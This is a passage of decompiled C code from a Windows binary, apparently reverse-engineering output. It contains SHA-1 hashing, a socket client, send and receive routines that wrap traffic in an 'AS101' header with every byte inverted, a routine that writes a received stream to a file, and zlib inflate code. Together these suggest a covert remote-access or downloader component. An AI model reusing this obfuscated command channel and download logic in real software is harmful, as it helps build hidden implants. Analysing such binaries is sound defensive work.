  uVar3 = (uVar7 ^ uVar2 ^ uVar6) + uVar8 + uVar1 + -0x359d3e2a + (uVar4 >> 0x1b | uVar4 * 0x20);
  *(uint *)(in_EAX + 0x40) = uVar8;
  uVar2 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x44) = uVar2;
  uVar8 = uVar4 >> 2 | uVar4 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar2 = (uVar7 ^ uVar5 ^ uVar4) + uVar2 + uVar6 + -0x359d3e2a + (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x48) = uVar1;
  uVar6 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = (uVar5 ^ uVar8 ^ uVar3) + uVar1 + uVar7 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar6;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar1 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x50) = uVar7;
  uVar2 = (uVar8 ^ uVar4 ^ uVar2) + uVar6 + uVar5 + -0x359d3e2a + (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar5 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar5 = uVar5 << 1 | (uint)((int)uVar5 < 0);
  *(uint *)(in_EAX + 0x54) = uVar5;
  uVar3 = (uVar3 ^ uVar4 ^ uVar1) + uVar7 + uVar8 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar4 = (uVar6 ^ uVar2 ^ uVar1) + uVar5 + uVar4 + -0x359d3e2a + (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x58) = uVar2;
  *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + uVar5;
  *(int *)(in_EAX + 8) =
       *(int *)(in_EAX + 8) +
       (uVar6 ^ uVar5 ^ uVar3) + uVar2 + uVar1 + -0x359d3e2a + (uVar4 >> 0x1b | uVar4 * 0x20);
  *(int *)(in_EAX + 0xc) = *(int *)(in_EAX + 0xc) + uVar4;
  *(int *)(in_EAX + 0x10) = *(int *)(in_EAX + 0x10) + (uVar3 >> 2 | uVar3 * 0x40000000);
  *(int *)(in_EAX + 0x18) = *(int *)(in_EAX + 0x18) + uVar6;
  return;
}



void FUN_00404564(void)

{
  undefined4 *in_EAX;
  
  in_EAX[1] = 0;
  *in_EAX = 0;
  in_EAX[2] = 0x67452301;
  in_EAX[3] = 0xefcdab89;
  in_EAX[4] = 0x98badcfe;
  in_EAX[5] = 0x10325476;
  in_EAX[6] = 0xc3d2e1f0;
  return;
}



void __thiscall FUN_0040458f(void *this,uint param_1)

{
  uint uVar1;
  uint *puVar2;
  size_t _Size;
  uint uVar3;
  uint *unaff_EDI;
  int local_c;
  void *local_8;
  
  uVar3 = *unaff_EDI & 0x3f;
  uVar1 = *unaff_EDI + param_1;
  _Size = 0x40 - uVar3;
  *unaff_EDI = uVar1;
  if (uVar1 < param_1) {
    unaff_EDI[1] = unaff_EDI[1] + 1;
  }
  local_8 = this;
  if (_Size <= param_1) {
    do {
      _memcpy((void *)((int)unaff_EDI + uVar3 + 0x1c),local_8,_Size);
      local_8 = (void *)((int)local_8 + _Size);
      param_1 = param_1 - _Size;
      _Size = 0x40;
      puVar2 = unaff_EDI + 0x17;
      uVar3 = 0;
      local_c = 0x10;
      do {
        local_c = local_c + -1;
        puVar2 = puVar2 + -1;
        uVar1 = *puVar2;
        *puVar2 = uVar1 >> 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18;
      } while (local_c != 0);
      FUN_0040369f();
    } while (0x3f < param_1);
  }
  _memcpy((void *)(uVar3 + 0x1c + (int)unaff_EDI),local_8,param_1);
  return;
}



void __cdecl FUN_00404628(int param_1)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  sbyte sVar4;
  uint uVar5;
  int iVar6;
  uint *unaff_ESI;
  uint *puVar7;
  
  uVar3 = *unaff_ESI;
  uVar2 = uVar3 & 0x3f;
  uVar5 = uVar2 + 3 >> 2;
  if (uVar5 != 0) {
    puVar7 = (uint *)((int)unaff_ESI + (uVar2 + 3 & 0xfffffffc) + 0x1c);
    do {
      puVar7 = puVar7 + -1;
      uVar1 = *puVar7;
      uVar5 = uVar5 - 1;
      *puVar7 = uVar1 >> 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18;
    } while (uVar5 != 0);
  }
  sVar4 = (sbyte)((~uVar2 & 3) << 3);
  *(uint *)((int)unaff_ESI + (uVar3 & 0x3c) + 0x1c) =
       -0x80 << sVar4 & *(uint *)((int)unaff_ESI + (uVar3 & 0x3c) + 0x1c) | 0x80 << sVar4;
  if (uVar2 < 0x38) {
    uVar3 = (uVar2 >> 2) + 1;
    if (0xd < uVar3) goto LAB_004046b2;
  }
  else {
    if (uVar2 < 0x3c) {
      unaff_ESI[0x16] = 0;
    }
    FUN_0040369f();
    uVar3 = 0;
  }
  puVar7 = unaff_ESI + uVar3 + 7;
  for (iVar6 = 0xe - uVar3; iVar6 != 0; iVar6 = iVar6 + -1) {
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
LAB_004046b2:
  unaff_ESI[0x16] = *unaff_ESI << 3;
  unaff_ESI[0x15] = unaff_ESI[1] << 3 | *unaff_ESI >> 0x1d;
  FUN_0040369f();
  uVar3 = 0;
  do {
    *(char *)(uVar3 + param_1) =
         (char)(*(uint *)((int)unaff_ESI + (uVar3 & 0xfffffffc) + 8) >> (sbyte)((~uVar3 & 3) << 3));
    uVar3 = uVar3 + 1;
  } while (uVar3 < 0x14);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __thiscall FUN_004046f8(void *this,wchar_t *param_1)

{
  uint uVar1;
  uint uVar2;
  uint local_1010;
  FILE *local_100c;
  undefined local_1008 [20];
  undefined local_ff4 [4076];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)local_ff4;
  local_100c = (FILE *)0x0;
  local_1010 = 0;
  __wfopen_s(&local_100c,param_1,(wchar_t *)&DAT_0041dd14);
  if (local_100c != (FILE *)0x0) {
    _fseek(local_100c,0,2);
    uVar1 = _ftell(local_100c);
    _fseek(local_100c,0,0);
    FUN_00404564();
    uVar2 = _fread(local_1008,1,0x1000,local_100c);
    while (uVar2 != 0) {
      FUN_0040458f(local_1008,uVar2);
      local_1010 = local_1010 + uVar2;
      uVar2 = _fread(local_1008,1,0x1000,local_100c);
    }
    FUN_00404628((int)this);
    _fclose(local_100c);
    if (uVar1 <= local_1010) goto LAB_004047f1;
  }
  _memset(this,0,0x14);
LAB_004047f1:
  ___security_check_cookie_4(local_8 ^ (uint)local_ff4);
  return;
}



void __thiscall FUN_00404808(void *this,char *param_1,u_short param_2)

{
  int iVar1;
  SOCKET SVar2;
  hostent *phVar3;
  SOCKET *unaff_EBX;
  wchar_t *_Dst;
  wchar_t *_Src;
  ulong local_9b8;
  char *local_9b4;
  undefined4 local_9b0;
  WSADATA local_9ac;
  sockaddr local_81c;
  wchar_t local_80c;
  undefined local_80a [2050];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_9b4 = param_1;
  local_80c = L'\0';
  _memset(local_80a,0,0x7fe);
  _Dst = &local_80c;
  if (this != (void *)0x0) {
    _Dst = (wchar_t *)this;
  }
  local_9b8 = 0;
  local_9b0 = 0;
  *_Dst = L'\0';
  iVar1 = WSAStartup(0x101,&local_9ac);
  if (iVar1 == 0) {
    SVar2 = socket(2,1,6);
    *unaff_EBX = SVar2;
    if (SVar2 != 0xffffffff) {
      phVar3 = gethostbyname(local_9b4);
      if (phVar3 == (hostent *)0x0) {
        local_9b8 = inet_addr(local_9b4);
        phVar3 = gethostbyaddr((char *)&local_9b8,4,2);
        if (phVar3 != (hostent *)0x0) goto LAB_00404948;
        _Src = (wchar_t *)&LAB_0041deb8;
      }
      else {
LAB_00404948:
        local_81c.sa_data._2_4_ = *(undefined4 *)*phVar3->h_addr_list;
        local_81c.sa_family = 2;
        local_81c.sa_data._0_2_ = ntohs(param_2);
        iVar1 = connect(*unaff_EBX,&local_81c,0x10);
        if (iVar1 == 0) {
          local_9b0 = 1;
          goto LAB_0040493a;
        }
        _Src = (wchar_t *)&DAT_0041df1c;
      }
      _wcscpy_s(_Dst,0x3ff,_Src);
      _wcscat_s(_Dst,0x3ff,(wchar_t *)&DAT_0041ded8);
      _wcscat_s(_Dst,0x3ff,(wchar_t *)&LAB_0041dedc);
      if (*unaff_EBX != 0) {
        closesocket(*unaff_EBX);
        *unaff_EBX = 0;
      }
      goto LAB_0040493a;
    }
  }
  _wcscpy_s(_Dst,0x3ff,(wchar_t *)&LAB_0041deb8);
  _wcscat_s(_Dst,0x3ff,(wchar_t *)&DAT_0041ded8);
  _wcscat_s(_Dst,0x3ff,(wchar_t *)&LAB_0041dedc);
LAB_0040493a:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 FUN_00404996(void)

{
  int iVar1;
  SOCKET *unaff_ESI;
  
  if (*unaff_ESI != 0) {
    iVar1 = closesocket(*unaff_ESI);
    if (iVar1 != 0) {
      return 0;
    }
    *unaff_ESI = 0;
  }
  return 1;
}



undefined4 __cdecl FUN_004049b1(SOCKET *param_1,void *param_2)

{
  uint len;
  SOCKET *buf;
  uint uVar1;
  int iVar2;
  size_t unaff_EDI;
  undefined4 local_8;
  
  iVar2 = 0;
  local_8 = 0;
  if (*param_1 != 0) {
    if (0 < (int)unaff_EDI) {
      do {
        *(byte *)((int)param_2 + iVar2) = ~*(byte *)((int)param_2 + iVar2);
        iVar2 = iVar2 + 1;
      } while (iVar2 < (int)unaff_EDI);
    }
    len = unaff_EDI + 7;
    buf = (SOCKET *)operator_new(len);
    *(short *)buf = (short)unaff_EDI + 5;
    _memcpy((short *)((int)buf + 2),s_AS101_004230c0,5);
    _memcpy((void *)((int)buf + 7),param_2,unaff_EDI);
    uVar1 = send(*param_1,(char *)buf,len,0);
    param_1 = buf;
    if ((uVar1 != 0xffffffff) && (uVar1 == len)) {
      local_8 = 1;
    }
  }
  if (param_1 != (SOCKET *)0x0) {
    FUN_0040b579(param_1);
  }
  return local_8;
}



void __fastcall
FUN_00404a3a(SOCKET *param_1,undefined2 *param_2,undefined2 param_3,void *param_4,size_t param_5)

{
  undefined2 *puVar1;
  int iVar2;
  size_t _Size;
  size_t _Size_00;
  undefined2 local_808 [58];
  undefined local_794 [1932];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)local_794;
  puVar1 = local_808;
  if (param_2 != (undefined2 *)0x0) {
    puVar1 = param_2;
  }
  *puVar1 = 0;
  if (*param_1 == 0) {
    puVar1 = (undefined2 *)0x0;
  }
  else {
    if (0xfffa < (int)param_5) {
      param_5 = 0xfffa;
    }
    puVar1 = (undefined2 *)operator_new(0x1000);
    _Size = param_5;
    if (0xffa < (int)param_5) {
      _Size = 0xffa;
    }
    *puVar1 = param_3;
    *(size_t *)(puVar1 + 1) = param_5;
    if ((param_4 == (void *)0x0) && (param_5 == 0)) {
      FUN_004049b1(param_1,puVar1);
    }
    else {
      _memcpy(puVar1 + 3,param_4,_Size);
      iVar2 = FUN_004049b1(param_1,puVar1);
      if (iVar2 != 0) {
        for (; (int)_Size < (int)param_5; _Size = _Size + _Size_00) {
          _Size_00 = param_5 - _Size;
          if (0x1000 < (int)_Size_00) {
            _Size_00 = 0x1000;
          }
          _memcpy(puVar1,(void *)((int)param_4 + _Size),_Size_00);
          iVar2 = FUN_004049b1(param_1,puVar1);
          if (iVar2 == 0) break;
        }
      }
    }
  }
  if (puVar1 != (undefined2 *)0x0) {
    FUN_0040b579(puVar1);
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_794);
  return;
}



void __fastcall FUN_00404b67(SOCKET *param_1,wchar_t *param_2,void *param_3,size_t *param_4)

{
  SOCKET s;
  int iVar1;
  uint uVar2;
  int iVar3;
  byte *pbVar4;
  size_t sVar5;
  size_t _Size;
  void *_Buf2;
  wchar_t *local_8d4;
  wchar_t local_8d0;
  undefined local_8ce [2046];
  undefined2 local_d0;
  undefined local_74 [108];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)local_74;
  local_8d0 = L'\0';
  _memset(local_8ce,0,0x7fe);
  local_8d4 = &local_8d0;
  if (param_2 != (wchar_t *)0x0) {
    local_8d4 = param_2;
  }
  *local_8d4 = L'\0';
  s = *param_1;
  _Buf2 = (void *)0x0;
  if ((s == 0) || (param_3 == (void *)0x0)) goto LAB_00404d35;
  local_d0 = local_d0 & 0xff00;
  _memset((void *)((int)&local_d0 + 1),0,199);
  iVar1 = recv(s,(char *)&local_d0,2,0);
  if ((iVar1 == -1) || (iVar1 == 0)) {
LAB_00404d22:
    _wcscpy_s(local_8d4,0x3ff,(wchar_t *)&DAT_0041df40);
  }
  else {
    uVar2 = (uint)local_d0;
    iVar1 = 0;
    _Buf2 = operator_new(uVar2 + 2);
    if (uVar2 != 0) {
      do {
        iVar3 = recv(*param_1,(char *)(iVar1 + (int)_Buf2),uVar2 - iVar1,0);
        if ((iVar3 == -1) || (iVar3 == 0)) {
          _wcscpy_s(local_8d4,0x3ff,(wchar_t *)&DAT_0041df40);
          WSAGetLastError();
          goto LAB_00404d2a;
        }
        iVar1 = iVar1 + iVar3;
      } while (iVar1 < (int)uVar2);
      if (4 < iVar1) {
        _Size = iVar1 - 5;
        iVar1 = _memcmp(s_AS101_004230c0,_Buf2,5);
        if (iVar1 != 0) goto LAB_00404d22;
        if (0 < (int)_Size) {
          pbVar4 = (byte *)((int)_Buf2 + 5);
          sVar5 = _Size;
          do {
            *pbVar4 = ~*pbVar4;
            pbVar4 = pbVar4 + 1;
            sVar5 = sVar5 - 1;
          } while (sVar5 != 0);
        }
        if ((int)*param_4 < (int)_Size) {
          _memcpy(param_3,(void *)((int)_Buf2 + 5),*param_4);
        }
        else {
          _memcpy(param_3,(void *)((int)_Buf2 + 5),_Size);
          *param_4 = _Size;
        }
      }
    }
  }
LAB_00404d2a:
  if (_Buf2 != (void *)0x0) {
    FUN_0040b579(_Buf2);
  }
LAB_00404d35:
  ___security_check_cookie_4(local_8 ^ (uint)local_74);
  return;
}



void __fastcall FUN_00404d4d(SOCKET *param_1,wchar_t *param_2,undefined2 *param_3,void *param_4)

{
  size_t sVar1;
  size_t sVar2;
  size_t _Size;
  undefined2 *_Src;
  int iVar3;
  int iVar4;
  size_t sVar5;
  size_t *unaff_EBX;
  size_t sVar6;
  wchar_t *local_814;
  size_t local_80c;
  wchar_t local_808;
  undefined local_806 [98];
  undefined local_7a4 [1948];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)local_7a4;
  local_808 = L'\0';
  _memset(local_806,0,0x7fe);
  local_814 = &local_808;
  if (param_2 != (wchar_t *)0x0) {
    local_814 = param_2;
  }
  *local_814 = L'\0';
  if ((*param_1 != 0) && (param_4 != (void *)0x0)) {
    local_80c = 0x1000;
    _Src = (undefined2 *)operator_new(0x1000);
    iVar3 = FUN_00404b67(param_1,local_814,_Src,&local_80c);
    sVar5 = local_80c;
    if ((iVar3 != 0) && (local_80c = local_80c - 6, sVar5 = local_80c, -1 < (int)local_80c)) {
      *param_3 = *_Src;
      iVar3 = *(int *)(_Src + 1);
      sVar5 = *unaff_EBX;
      if ((int)sVar5 < (int)local_80c) {
        sVar6 = 0;
        if (0 < (int)sVar5) {
          _memcpy(param_4,_Src + 3,sVar5);
          sVar6 = *unaff_EBX;
        }
      }
      else {
        _memcpy(param_4,_Src + 3,local_80c);
        sVar6 = local_80c;
      }
      while (sVar1 = local_80c, (int)local_80c < iVar3) {
        local_80c = 0x1000;
        iVar4 = FUN_00404b67(param_1,local_814,_Src,&local_80c);
        _Size = local_80c;
        sVar5 = local_80c;
        if ((iVar4 == 0) || (sVar5 = sVar1 + local_80c, 0x10000 < (int)sVar5)) goto LAB_00404ebb;
        sVar2 = *unaff_EBX;
        sVar1 = sVar6 + local_80c;
        local_80c = sVar5;
        if ((int)sVar2 < (int)sVar1) {
          if ((int)sVar6 < (int)sVar2) {
            _memcpy((void *)((int)param_4 + sVar6),_Src,sVar2 - sVar6);
            sVar6 = *unaff_EBX;
          }
        }
        else {
          _memcpy((void *)((int)param_4 + sVar6),_Src,_Size);
          sVar6 = sVar1;
        }
      }
      *unaff_EBX = sVar6;
      sVar5 = local_80c;
    }
LAB_00404ebb:
    local_80c = sVar5;
    if (_Src != (undefined2 *)0x0) {
      FUN_0040b579(_Src);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_7a4);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00404ee0(FILE **param_1)

{
  int iVar1;
  size_t _Count;
  uint uVar2;
  SOCKET *unaff_EDI;
  uint local_100c;
  char local_1008 [116];
  undefined local_f94 [3980];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)local_f94;
  uVar2 = 0;
  iVar1 = recv(*unaff_EDI,(char *)&local_100c,4,0);
  if (iVar1 == 4) {
    if (local_100c != 0) {
      do {
        _Count = recv(*unaff_EDI,local_1008,0x1000,0);
        if (_Count == 0) break;
        _fwrite(local_1008,1,_Count,*param_1);
        uVar2 = uVar2 + _Count;
        _DAT_004246fc = uVar2;
      } while (uVar2 < local_100c);
    }
    _fclose(*param_1);
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_f94);
  return;
}



void __cdecl FUN_00404f8b(undefined4 param_1,void *param_2,void *param_3)

{
  undefined4 *puVar1;
  void **unaff_EDI;
  undefined local_240 [556];
  void *local_14;
  uint local_c;
  
  local_c = DAT_00422044 ^ (uint)&stack0xfffffffc;
  puVar1 = FUN_0040826a(param_1,param_2);
  if (puVar1 != (undefined4 *)0x0) {
    FUN_0040830f(local_240,(void *)0xffffffff);
    FUN_0040830f(local_240,(void *)0x0);
    FUN_0040834f(param_3,*unaff_EDI);
    *unaff_EDI = local_14;
    FUN_00408380();
  }
  ___security_check_cookie_4(local_c ^ (uint)&stack0xfffffffc);
  return;
}



int __cdecl FUN_00404ff9(int param_1)

{
  uint uVar1;
  undefined4 uVar2;
  void *pvVar3;
  uint uVar4;
  int unaff_ESI;
  int unaff_EDI;
  void *local_c;
  void *local_8;
  
  local_8 = *(void **)(unaff_ESI + 0x30);
  local_c = *(void **)(unaff_EDI + 0xc);
  pvVar3 = *(void **)(unaff_ESI + 0x34);
  if (pvVar3 < local_8) {
    pvVar3 = *(void **)(unaff_ESI + 0x2c);
  }
  uVar1 = *(uint *)(unaff_EDI + 0x10);
  uVar4 = (int)pvVar3 - (int)local_8;
  if (uVar1 < (uint)((int)pvVar3 - (int)local_8)) {
    uVar4 = uVar1;
  }
  if ((uVar4 != 0) && (param_1 == -5)) {
    param_1 = 0;
  }
  *(int *)(unaff_EDI + 0x14) = *(int *)(unaff_EDI + 0x14) + uVar4;
  *(uint *)(unaff_EDI + 0x10) = uVar1 - uVar4;
  if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
    uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),local_8,uVar4);
    *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
    *(undefined4 *)(unaff_EDI + 0x30) = uVar2;
  }
  if (uVar4 != 0) {
    _memcpy(local_c,local_8,uVar4);
    local_c = (void *)((int)local_c + uVar4);
    local_8 = (void *)((int)local_8 + uVar4);
  }
  if (local_8 == *(void **)(unaff_ESI + 0x2c)) {
    local_8 = *(void **)(unaff_ESI + 0x28);
    if (*(void **)(unaff_ESI + 0x34) == *(void **)(unaff_ESI + 0x2c)) {
      *(void **)(unaff_ESI + 0x34) = local_8;
    }
    uVar1 = *(uint *)(unaff_EDI + 0x10);
    uVar4 = *(int *)(unaff_ESI + 0x34) - (int)local_8;
    if (uVar1 < uVar4) {
      uVar4 = uVar1;
    }
    if ((uVar4 != 0) && (param_1 == -5)) {
      param_1 = 0;
    }
    *(int *)(unaff_EDI + 0x14) = *(int *)(unaff_EDI + 0x14) + uVar4;
    *(uint *)(unaff_EDI + 0x10) = uVar1 - uVar4;
    if (*(code **)(unaff_ESI + 0x38) != (code *)0x0) {
      uVar2 = (**(code **)(unaff_ESI + 0x38))(*(undefined4 *)(unaff_ESI + 0x3c),local_8,uVar4);
      *(undefined4 *)(unaff_ESI + 0x3c) = uVar2;
      *(undefined4 *)(unaff_EDI + 0x30) = uVar2;
    }
    if (uVar4 != 0) {
      _memcpy(local_c,local_8,uVar4);
      local_c = (void *)((int)local_c + uVar4);
      local_8 = (void *)((int)local_8 + uVar4);
    }
  }
  *(void **)(unaff_EDI + 0xc) = local_c;
  *(void **)(unaff_ESI + 0x30) = local_8;
  return param_1;
}



void __cdecl FUN_004050e2(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4)

{
  int in_EAX;
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x1c);
  if (puVar1 != (undefined4 *)0x0) {
    *puVar1 = 0;
    *(undefined *)(puVar1 + 4) = param_1;
    *(undefined *)((int)puVar1 + 0x11) = param_2;
    puVar1[5] = param_3;
    puVar1[6] = param_4;
  }
  return;
}



void __cdecl FUN_00405113(int param_1)

{
  byte bVar1;
  uint *puVar2;
  undefined *puVar3;
  int in_EAX;
  byte *pbVar4;
  uint uVar5;
  uint uVar6;
  undefined *puVar7;
  undefined *puVar8;
  byte **unaff_EBX;
  undefined *local_20;
  undefined *local_18;
  byte *local_14;
  byte *local_10;
  uint local_c;
  uint local_8;
  
  local_10 = *unaff_EBX;
  puVar8 = *(undefined **)(in_EAX + 0x34);
  local_14 = unaff_EBX[1];
  local_c = *(uint *)(in_EAX + 0x20);
  puVar2 = *(uint **)(in_EAX + 4);
  local_8 = *(uint *)(in_EAX + 0x1c);
  if (puVar8 < *(undefined **)(in_EAX + 0x30)) {
    local_18 = *(undefined **)(in_EAX + 0x30) + (-1 - (int)puVar8);
  }
  else {
    local_18 = (undefined *)(*(int *)(in_EAX + 0x2c) - (int)puVar8);
  }
  uVar6 = *puVar2;
  while (puVar7 = puVar8, uVar6 < 10) {
    switch((&switchD_0040518a::switchdataD_0040562b)[uVar6]) {
    case (undefined *)0x405191:
      if ((local_18 < (undefined *)0x102) || (local_14 < (byte *)0xa)) {
LAB_00405232:
        puVar2[3] = (uint)*(byte *)(puVar2 + 4);
        puVar2[2] = puVar2[5];
        *puVar2 = 1;
        goto switchD_0040518a_caseD_405272;
      }
      *(uint *)(in_EAX + 0x20) = local_c;
      *(uint *)(in_EAX + 0x1c) = local_8;
      unaff_EBX[1] = local_14;
      pbVar4 = *unaff_EBX;
      *unaff_EBX = local_10;
      unaff_EBX[2] = unaff_EBX[2] + ((int)local_10 - (int)pbVar4);
      *(undefined **)(in_EAX + 0x34) = puVar8;
      param_1 = FUN_0040645a((uint)*(byte *)((int)puVar2 + 0x11),unaff_EBX,
                             (uint)*(byte *)(puVar2 + 4),(uint)*(byte *)((int)puVar2 + 0x11),
                             puVar2[5],puVar2[6]);
      local_10 = *unaff_EBX;
      puVar8 = *(undefined **)(in_EAX + 0x34);
      local_14 = unaff_EBX[1];
      local_c = *(uint *)(in_EAX + 0x20);
      local_8 = *(uint *)(in_EAX + 0x1c);
      if (puVar8 < *(undefined **)(in_EAX + 0x30)) {
        local_18 = *(undefined **)(in_EAX + 0x30) + (-1 - (int)puVar8);
      }
      else {
        local_18 = (undefined *)(*(int *)(in_EAX + 0x2c) - (int)puVar8);
      }
      if (param_1 == 0) goto LAB_00405232;
      *puVar2 = (uint)(param_1 != 1) * 2 + 7;
      goto LAB_00405587;
    case (undefined *)0x405272:
switchD_0040518a_caseD_405272:
      for (; local_8 < puVar2[3]; local_8 = local_8 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_0040559a;
        param_1 = 0;
        local_14 = local_14 + -1;
        local_c = local_c | (uint)*local_10 << ((byte)local_8 & 0x1f);
        local_10 = local_10 + 1;
      }
      pbVar4 = (byte *)(puVar2[2] + (*(uint *)(&DAT_0041e5e8 + puVar2[3] * 4) & local_c) * 8);
      local_c = local_c >> (pbVar4[1] & 0x1f);
      local_8 = local_8 - pbVar4[1];
      bVar1 = *pbVar4;
      uVar6 = (uint)bVar1;
      if (uVar6 == 0) {
        pbVar4 = *(byte **)(pbVar4 + 4);
        *puVar2 = 6;
        goto LAB_004052b1;
      }
      if ((bVar1 & 0x10) == 0) {
        if ((bVar1 & 0x40) != 0) {
          if ((bVar1 & 0x20) == 0) {
            *puVar2 = 9;
            unaff_EBX[6] = (byte *)s_invalid_literal_length_code_0041fdcc;
            goto switchD_0040518a_caseD_4055c2;
          }
          *puVar2 = 7;
          goto LAB_00405587;
        }
        goto LAB_004052dd;
      }
      puVar2[2] = uVar6 & 0xf;
      puVar2[1] = *(uint *)(pbVar4 + 4);
      *puVar2 = 2;
      goto LAB_00405587;
    case (undefined *)0x40531f:
      for (; uVar6 = puVar2[2], local_8 < uVar6; local_8 = local_8 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_0040559a;
        param_1 = 0;
        local_14 = local_14 + -1;
        local_c = local_c | (uint)*local_10 << ((byte)local_8 & 0x1f);
        local_10 = local_10 + 1;
      }
      uVar5 = *(uint *)(&DAT_0041e5e8 + uVar6 * 4) & local_c;
      local_c = local_c >> ((byte)uVar6 & 0x1f);
      puVar2[1] = puVar2[1] + uVar5;
      local_8 = local_8 - uVar6;
      puVar2[3] = (uint)*(byte *)((int)puVar2 + 0x11);
      puVar2[2] = puVar2[6];
      *puVar2 = 3;
    case (undefined *)0x405377:
      for (; local_8 < puVar2[3]; local_8 = local_8 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_0040559a;
        param_1 = 0;
        local_14 = local_14 + -1;
        local_c = local_c | (uint)*local_10 << ((byte)local_8 & 0x1f);
        local_10 = local_10 + 1;
      }
      pbVar4 = (byte *)(puVar2[2] + (*(uint *)(&DAT_0041e5e8 + puVar2[3] * 4) & local_c) * 8);
      local_c = local_c >> (pbVar4[1] & 0x1f);
      local_8 = local_8 - pbVar4[1];
      bVar1 = *pbVar4;
      uVar6 = (uint)bVar1;
      if ((bVar1 & 0x10) == 0) {
        if ((bVar1 & 0x40) != 0) {
          *puVar2 = 9;
          unaff_EBX[6] = (byte *)s_invalid_distance_code_0041fde8;
switchD_0040518a_caseD_4055c2:
          param_1 = -3;
          puVar7 = puVar8;
          goto LAB_0040515a;
        }
LAB_004052dd:
        puVar2[3] = uVar6;
        pbVar4 = pbVar4 + *(int *)(pbVar4 + 4) * 8;
LAB_004052b1:
        puVar2[2] = (uint)pbVar4;
      }
      else {
        puVar2[2] = uVar6 & 0xf;
        puVar2[3] = *(uint *)(pbVar4 + 4);
        *puVar2 = 4;
      }
LAB_00405587:
      uVar6 = *puVar2;
      break;
    case (undefined *)0x405406:
      for (; uVar6 = puVar2[2], local_8 < uVar6; local_8 = local_8 + 8) {
        if (local_14 == (byte *)0x0) goto LAB_0040559a;
        param_1 = 0;
        local_14 = local_14 + -1;
        local_c = local_c | (uint)*local_10 << ((byte)local_8 & 0x1f);
        local_10 = local_10 + 1;
      }
      uVar5 = *(uint *)(&DAT_0041e5e8 + uVar6 * 4) & local_c;
      local_c = local_c >> ((byte)uVar6 & 0x1f);
      puVar2[3] = puVar2[3] + uVar5;
      local_8 = local_8 - uVar6;
      *puVar2 = 5;
    case (undefined *)0x405429:
      local_20 = puVar8 + -puVar2[3];
      if (local_20 < *(undefined **)(in_EAX + 0x28)) {
        do {
          local_20 = local_20 + (*(int *)(in_EAX + 0x2c) - (int)*(undefined **)(in_EAX + 0x28));
        } while (local_20 < *(undefined **)(in_EAX + 0x28));
      }
      while (puVar2[1] != 0) {
        puVar7 = puVar8;
        if (local_18 == (undefined *)0x0) {
          if (puVar8 == *(undefined **)(in_EAX + 0x2c)) {
            local_18 = *(undefined **)(in_EAX + 0x30);
            puVar7 = *(undefined **)(in_EAX + 0x28);
            if (local_18 != puVar7) {
              if (puVar7 < local_18) {
                local_18 = local_18 + (-1 - (int)puVar7);
              }
              else {
